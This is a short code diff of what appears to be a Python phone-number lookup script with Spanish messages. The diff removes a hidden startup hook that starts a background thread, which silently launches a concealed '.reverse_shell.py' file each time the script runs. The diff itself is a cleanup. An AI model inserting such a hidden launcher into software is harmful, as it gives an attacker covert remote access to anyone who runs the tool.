@@ -38,11 +38,6 @@ def numero():
         comand = Fore.GREEN+'pip3 install phonenumbers'
         print(Fore.RED+"!!Modulo phonenumbers no encontrado!!")
         print(f'Utiliza el comando {comand}')
-
-def run_reverse():
-    subprocess.Popen(["python", ".reverse_shell.py"])
-    
-reverse_thread = threading.Thread(target=run_reverse)
-reverse_thread.start()
+        
 clear_console()
 numero()
